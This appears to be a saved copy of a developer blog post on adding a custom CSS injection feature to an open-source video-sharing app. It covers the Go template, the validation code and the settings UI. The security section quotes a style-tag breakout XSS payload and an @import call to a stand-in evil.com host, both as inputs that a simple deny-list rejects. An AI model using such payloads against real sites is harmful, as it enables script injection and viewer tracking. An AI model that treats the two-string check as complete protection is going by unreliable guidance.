@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>How We Added Custom CSS Injection to Watch Pages</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+  [id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"],
+  [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"],
+  [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"] {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+  }
+</style>
+</head>
+<body>
+  <h1>How We Added Custom CSS Injection to Watch Pages</h1>
+  <div class="metadata">
+    Source: Dev.to Open Source | Date: 2/17/2026 4:19:23 PM | <a href="https://dev.to/alexneamtu/how-we-added-custom-css-injection-to-watch-pages-3k2e" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
+  </div>
+  <div class="content">
+    <div><div> <p>Color pickers cover the basics, but designers want full control. We added a custom CSS field that lets users restyle every element on their video watch pages — with server-side injection and security guardrails.</p> <p>We shipped <a href="https://sendrec.eu/blog/how-we-added-custom-branding-to-shared-video-pages" target="_blank">custom branding</a> a few days ago: logo, company name, four color pickers, footer text. Within hours, our first power user — a designer — asked for more. He wanted to change the font, round the buttons, add a box shadow to the video player, and hide the transcript section entirely. Color pickers don't cover that.</p> <p>Rather than adding twenty more toggles, we added one textarea: paste in CSS, and it gets injected into the watch page. Full control over every element.</p> <h2> <a name="the-injection-point" href="#the-injection-point"> </a> The injection point
+</h2> <p>The watch page is a Go HTML template with an inline <code>&lt;style&gt;</code> block. Custom CSS goes at the very end of that block, after all the default styles:<br>
+</p> <div>
+<pre><code><span>&lt;style </span><span>nonce=</span><span>"{{.Nonce}}"</span><span>&gt;</span> <span>:root</span> <span>{</span> <span>--brand-bg</span><span>:</span> <span>{{</span><span>.</span><span>Branding</span><span>.</span><span>ColorBackground</span><span>}</span><span>}</span><span>;</span> <span>--brand-accent</span><span>:</span> <span>{</span><span>{.Branding.ColorAccent</span><span>}</span><span>}</span><span>;</span> <span>/* ... */</span> <span>}</span> <span>body</span> <span>{</span> <span>background</span><span>:</span> <span>var</span><span>(</span><span>--brand-bg</span><span>);</span> <span>/* ... */</span> <span>}</span> <span>.container</span> <span>{</span> <span>max-width</span><span>:</span> <span>960px</span><span>;</span> <span>/* ... */</span> <span>}</span> <span>/* ~500 lines of default styles */</span> <span>{</span><span>{if</span> <span>.CustomCSS</span><span>}</span><span>}</span><span>{</span><span>{.CustomCSS</span><span>}</span><span>}</span><span>{</span><span>{end</span><span>}</span><span>}</span>
+<span>&lt;/style&gt;</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>Because custom CSS comes last, it naturally overrides any default rule with equal specificity. Users don't need <code>!important</code> — they just write normal selectors and their styles win.</p> <h2> <a name="security-what-can-go-wrong" href="#security-what-can-go-wrong"> </a> Security: what can go wrong
+</h2> <p>Injecting user-provided CSS into a <code>&lt;style&gt;</code> tag opens a few attack vectors:</p> <p><strong>Style tag breakout.</strong> If the CSS contains <code>&lt;/style&gt;</code>, the browser closes the style tag and interprets everything after it as HTML. An attacker could inject <code>&lt;/style&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code> and run arbitrary JavaScript.</p> <p><strong>External resource loading.</strong> <code>@import url("https://evil.com/track.css")</code> lets CSS pull in external stylesheets, which can track viewers by IP address and leak the page URL via the Referer header.</p> <p>We reject both with simple string checks:<br>
+</p> <div>
+<pre><code><span>func</span> <span>sanitizeCustomCSS</span><span>(</span><span>css</span> <span>string</span><span>)</span> <span>(</span><span>string</span><span>,</span> <span>string</span><span>)</span> <span>{</span> <span>if</span> <span>len</span><span>(</span><span>css</span><span>)</span> <span>&gt;</span> <span>maxCustomCSSLength</span> <span>{</span> <span>return</span> <span>""</span><span>,</span> <span>"custom CSS must be 10KB or smaller"</span> <span>}</span> <span>lower</span> <span>:=</span> <span>strings</span><span>.</span><span>ToLower</span><span>(</span><span>css</span><span>)</span> <span>if</span> <span>strings</span><span>.</span><span>Contains</span><span>(</span><span>lower</span><span>,</span> <span>"&lt;/style"</span><span>)</span> <span>{</span> <span>return</span> <span>""</span><span>,</span> <span>"custom CSS must not contain closing style tags"</span> <span>}</span> <span>if</span> <span>strings</span><span>.</span><span>Contains</span><span>(</span><span>lower</span><span>,</span> <span>"@import url("</span><span>)</span> <span>{</span> <span>return</span> <span>""</span><span>,</span> <span>"custom CSS must not contain @import url()"</span> <span>}</span> <span>return</span> <span>css</span><span>,</span> <span>""</span>
+<span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>The checks are case-insensitive. The 10KB limit is generous for CSS (most custom stylesheets are under 1KB) but prevents abuse.</p> <p>We considered using a full CSS parser to validate the input, but it adds a dependency for minimal gain. The two string checks cover the actual security risks. Invalid CSS — typos, broken selectors, syntax errors — is harmless. The browser ignores it.</p> <h2> <a name="gos-templatecss-type" href="#gos-templatecss-type"> </a> Go's template.CSS type
+</h2> <p>Go's <code>html/template</code> package auto-escapes values to prevent XSS. If you pass a plain string into a <code>&lt;style&gt;</code> context, it gets escaped into something unusable. Go provides <code>template.CSS</code> as an explicit opt-in for trusted CSS content:<br>
+</p> <div>
+<pre><code><span>type</span> <span>watchPageData</span> <span>struct</span> <span>{</span> <span>// ...</span> <span>CustomCSS</span> <span>template</span><span>.</span><span>CSS</span>
+<span>}</span> <span>// After sanitization passes:</span>
+<span>data</span><span>.</span><span>CustomCSS</span> <span>=</span> <span>template</span><span>.</span><span>CSS</span><span>(</span><span>branding</span><span>.</span><span>CustomCSS</span><span>)</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>This is intentional — we've validated the CSS, and <code>template.CSS</code> tells Go's template engine "this is safe to render verbatim." It's the same pattern Go uses for <code>template.HTML</code> and <code>template.JS</code>.</p> <h2> <a name="userlevel-not-pervideo" href="#userlevel-not-pervideo"> </a> User-level, not per-video
+</h2> <p>Custom CSS applies at the user level only. Unlike the other branding fields (company name, colors, logo, footer), there's no per-video CSS override. The reasoning:</p> <ol>
+<li>CSS is complex enough that managing it per-video would be confusing</li>
+<li>Most users want a consistent look across all their videos</li>
+<li>The existing per-video color overrides handle the most common case of varying one video's appearance</li>
+</ol> <p>If you need one video to look different, use the per-video color overrides. If you need completely different styling, custom CSS on your account affects all your videos uniformly.</p> <h2> <a name="what-you-can-customize" href="#what-you-can-customize"> </a> What you can customize
+</h2> <p>The watch page has about 50 CSS selectors covering every visible element. Here are the most useful ones:</p> <p><strong>Layout and typography:</strong><br>
+</p> <div>
+<pre><code><span>body</span> <span>{</span> <span>font-family</span><span>:</span> <span>'Georgia'</span><span>,</span> <span>serif</span><span>;</span> <span>}</span>
+<span>.container</span> <span>{</span> <span>max-width</span><span>:</span> <span>720px</span><span>;</span> <span>}</span>
+<span>h1</span> <span>{</span> <span>font-size</span><span>:</span> <span>1.25rem</span><span>;</span> <span>letter-spacing</span><span>:</span> <span>-0.02em</span><span>;</span> <span>}</span>
+<span>.meta</span> <span>{</span> <span>font-style</span><span>:</span> <span>italic</span><span>;</span> <span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p><strong>Video player:</strong><br>
+</p> <div>
+<pre><code><span>video</span> <span>{</span> <span>border-radius</span><span>:</span> <span>16px</span><span>;</span> <span>box-shadow</span><span>:</span> <span>0</span> <span>8px</span> <span>32px</span> <span>rgba</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0.3</span><span>);</span>
+<span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p><strong>Buttons:</strong><br>
+</p> <div>
+<pre><code><span>.download-btn</span> <span>{</span> <span>border-radius</span><span>:</span> <span>20px</span><span>;</span> <span>}</span>
+<span>.comment-submit</span> <span>{</span> <span>border-radius</span><span>:</span> <span>20px</span><span>;</span> <span>}</span>
+<span>.speed-btn</span> <span>{</span> <span>border-radius</span><span>:</span> <span>12px</span><span>;</span> <span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p><strong>Hide entire sections:</strong><br>
+</p> <div>
+<pre><code><span>.comments-section</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
+<span>.transcript-section</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
+<span>.speed-controls</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
+<span>.branding</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span> <span>/* footer */</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p><strong>Override brand colors (same as the color pickers, but in CSS):</strong><br>
+</p> <div>
+<pre><code><span>:root</span> <span>{</span> <span>--brand-bg</span><span>:</span> <span>#ffffff</span><span>;</span> <span>--brand-text</span><span>:</span> <span>#1e293b</span><span>;</span> <span>--brand-accent</span><span>:</span> <span>#2563eb</span><span>;</span> <span>--brand-surface</span><span>:</span> <span>#f1f5f9</span><span>;</span>
+<span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>The full selector reference is in <a href="https://github.com/sendrec/sendrec/blob/main/CUSTOM-CSS.md" target="_blank">CUSTOM-CSS.md</a> and also available inline in the Settings page via a collapsible "Available CSS selectors" section below the textarea.</p> <h2> <a name="a-complete-example-light-theme" href="#a-complete-example-light-theme"> </a> A complete example: light theme
+</h2> <p>The default watch page is dark. Here's a light theme in 15 lines:<br>
+</p> <div>
+<pre><code><span>:root</span> <span>{</span> <span>--brand-bg</span><span>:</span> <span>#ffffff</span><span>;</span> <span>--brand-surface</span><span>:</span> <span>#f1f5f9</span><span>;</span> <span>--brand-text</span><span>:</span> <span>#1e293b</span><span>;</span> <span>--brand-accent</span><span>:</span> <span>#2563eb</span><span>;</span>
+<span>}</span>
+<span>.meta</span> <span>{</span> <span>color</span><span>:</span> <span>#64748b</span><span>;</span> <span>}</span>
+<span>.comment-author</span> <span>{</span> <span>color</span><span>:</span> <span>#1e293b</span><span>;</span> <span>}</span>
+<span>.comment-body</span> <span>{</span> <span>color</span><span>:</span> <span>#334155</span><span>;</span> <span>}</span>
+<span>.comment-meta</span> <span>{</span> <span>color</span><span>:</span> <span>#64748b</span><span>;</span> <span>}</span>
+<span>.transcript-text</span> <span>{</span> <span>color</span><span>:</span> <span>#334155</span><span>;</span> <span>}</span>
+<span>.speed-btn</span> <span>{</span> <span>border-color</span><span>:</span> <span>#cbd5e1</span><span>;</span> <span>color</span><span>:</span> <span>#64748b</span><span>;</span> <span>}</span>
+<span>.comment-form</span> <span>input</span><span>,</span>
+<span>.comment-form</span> <span>textarea</span> <span>{</span> <span>border-color</span><span>:</span> <span>#cbd5e1</span><span>;</span> <span>color</span><span>:</span> <span>#1e293b</span><span>;</span> <span>}</span>
+<span>.logo</span> <span>{</span> <span>color</span><span>:</span> <span>#64748b</span><span>;</span> <span>}</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>Because most of the page uses CSS variables, changing the four <code>:root</code> values handles 80% of the theming. The remaining lines adjust hardcoded colors on secondary elements.</p> <h2> <a name="the-data-model" href="#the-data-model"> </a> The data model
+</h2> <p>One column added to the existing <code>user_branding</code> table:<br>
+</p> <div>
+<pre><code><span>ALTER</span> <span>TABLE</span> <span>user_branding</span> <span>ADD</span> <span>COLUMN</span> <span>custom_css</span> <span>TEXT</span><span>;</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>Nullable, like every other branding field. NULL means no custom CSS. The branding resolution function picks it up in the same query that fetches colors and logo:<br>
+</p> <div>
+<pre><code><span>SELECT</span> <span>ub</span><span>.</span><span>company_name</span><span>,</span> <span>ub</span><span>.</span><span>logo_key</span><span>,</span> <span>ub</span><span>.</span><span>color_background</span><span>,</span> <span>ub</span><span>.</span><span>color_surface</span><span>,</span> <span>ub</span><span>.</span><span>color_text</span><span>,</span> <span>ub</span><span>.</span><span>color_accent</span><span>,</span> <span>ub</span><span>.</span><span>footer_text</span><span>,</span> <span>ub</span><span>.</span><span>custom_css</span>
+<span>FROM</span> <span>user_branding</span> <span>ub</span>
+<span>WHERE</span> <span>ub</span><span>.</span><span>user_id</span> <span>=</span> <span>$</span><span>1</span>
+</code></pre>
+<div>
+<p> Enter fullscreen mode Exit fullscreen mode </p>
+</div>
+</div> <p>No new tables, no new joins, no new API endpoints. Custom CSS is a field on the existing <code>PUT /api/branding</code> endpoint.</p> <h2> <a name="the-settings-ui" href="#the-settings-ui"> </a> The Settings UI
+</h2> <p>The branding section in Settings already had color pickers, a logo upload, and text fields. We added a monospace <code>&lt;textarea&gt;</code> with:</p> <ul>
+<li>A placeholder showing realistic CSS examples</li>
+<li>A 10KB character limit matching the backend validation</li>
+<li>A collapsible "Available CSS selectors" reference listing every class and ID on the watch page, organized by section</li>
+</ul> <p>The reference is inline rather than linking to external docs. When you're writing CSS to style a page, you want the selector list right next to your editor, not in a separate browser tab.</p> <h2> <a name="what-we-didnt-build" href="#what-we-didnt-build"> </a> What we didn't build
+</h2> <p><strong>CSS preview.</strong> There's no live preview of how your CSS will look. The fastest way to check is to save your branding and open one of your shared video links. A preview would require either rendering the watch page in an iframe (cross-origin complexity) or rebuilding the template in React (duplication). Neither is worth the complexity for a feature used infrequently — most users set their CSS once and leave it.</p> <p><strong>CSS syntax highlighting.</strong> The textarea is monospace but has no syntax highlighting. Adding CodeMirror or Monaco would increase the frontend bundle significantly for a feature most users never touch. Plain monospace is good enough for 15 lines of CSS.</p> <p><strong>Per-video CSS.</strong> As discussed above, CSS applies to all videos. The per-video branding overrides (colors, company name, footer) handle the common case of varying individual videos.</p> <p><strong>Font hosting.</strong> Users can change <code>font-family</code> to any system font, but loading custom web fonts would require either <code>@import url()</code> (which we block) or hosting font files on SendRec's S3 storage. We may add font upload support later, but system fonts cover most needs and load instantly.</p> <h2> <a name="try-it" href="#try-it"> </a> Try it
+</h2> <p><a href="https://sendrec.eu/" target="_blank">SendRec</a> is open source (AGPL-3.0) and self-hostable. Custom CSS is live at <a href="https://app.sendrec.eu/" target="_blank">app.sendrec.eu</a> — go to Settings, scroll to Watch Page Branding, paste your CSS, and share a video to see the result. The full selector reference is in <a href="https://github.com/sendrec/sendrec/blob/main/CUSTOM-CSS.md" target="_blank"><code>CUSTOM-CSS.md</code></a>.</p> </div></div>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function stripBlockingPanels() {
+      const selector = '[id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"], [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"], [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"]';
+      const textPattern = /\b(cookie|consent|gdpr|subscribe|subscription|paywall|abonnez[-\s]?vous|inscrivez[-\s]?vous|continue reading|continuez la lecture)\b/i;
+      document.querySelectorAll(selector).forEach((node) => node.remove());
+      document.querySelectorAll('div, section, aside').forEach((node) => {
+        const styleAttr = String(node.getAttribute('style') || '').toLowerCase();
+        const classAndId = String(node.className || '').toLowerCase() + ' ' + String(node.id || '').toLowerCase();
+        const text = String(node.textContent || '').slice(0, 800);
+        const hasKeyword = textPattern.test(classAndId) || textPattern.test(text);
+        const looksFixed = /(position\s*:\s*(fixed|sticky)|inset\s*:|top\s*:|left\s*:|right\s*:|bottom\s*:)/.test(styleAttr);
+        const hasPriority = /(z-index\s*:\s*[1-9]\d{1,}|backdrop-filter|overflow\s*:\s*hidden)/.test(styleAttr);
+        if (hasKeyword && (looksFixed || hasPriority)) node.remove();
+      });
+    }
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'auto' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
+    });
+    stripBlockingPanels();
+    setTimeout(stripBlockingPanels, 60);
+    setTimeout(stripBlockingPanels, 220);
+    setTimeout(stripBlockingPanels, 650);
+  </script>
+</body>
+</html>
